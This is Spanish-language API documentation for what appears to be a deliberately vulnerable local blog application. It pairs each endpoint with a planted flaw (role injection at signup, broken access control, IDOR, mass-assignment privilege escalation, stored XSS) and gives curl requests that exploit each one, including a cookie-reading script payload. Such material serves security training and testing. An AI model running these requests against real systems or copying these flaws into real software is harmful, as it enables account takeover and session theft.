Auth

POST /api/signup Sin auth
Crear cuenta nueva. Acepta: name, email, passkey.
⚠ No valida el campo role — si se envía, se guarda tal cual.
curl -X POST http://vblog.local/api/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@x.com","passkey":"1234","role":"admin"}'
POST /api/login Sin auth
Login. Devuelve cookie de sesión. Campos: email, passkey. 
curl -c cookies.txt -X POST http://vblog.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"editor01@vblog.local","passkey":"editor01pass"}'

Usuarios

GET /api/users Auth requerida
Devuelve todos los usuarios. Cualquier usuario autenticado puede acceder (sin verificar rol).
⚠ Broken Access Control — debería requerir rol admin.
GET /api/users/{id} Sin auth
Ver cualquier usuario por ID sin autenticación. IDOR + Information Disclosure. 
curl http://vblog.local/api/users/52
PUT /api/update/user/{id} Auth requerida
Actualizar datos de usuario. Usa $user->update($request->all()) sin filtrar campos.
⚠ Mass Assignment — el campo role está en $fillable y no hay validación de propiedad. Cualquier usuario autenticado puede escalar su propio rol.
# Escalar a editor
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"editor"}'

# Escalar a admin
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

Posts

GET /api/posts Sin auth
Listar todos los posts paginados.
GET /api/posts/{id} Sin auth
Ver post por ID. No valida si el post pertenece al usuario — IDOR. 
curl http://vblog.local/api/posts/5

Comentarios

POST /api/create/comment Auth requerida
Crear comentario. El campo content se almacena sin sanitizar y se renderiza con {!! !!} en la vista.
⚠ Stored XSS — inyectar HTML/JS en content. Se ejecuta para cualquier usuario que lea el post.
curl -b cookies.txt -X POST http://vblog.local/api/create/comment \
  -H "Content-Type: application/json" \
  -d '{"post_id":1,"content":"<script>alert(document.cookie)</script>"}'
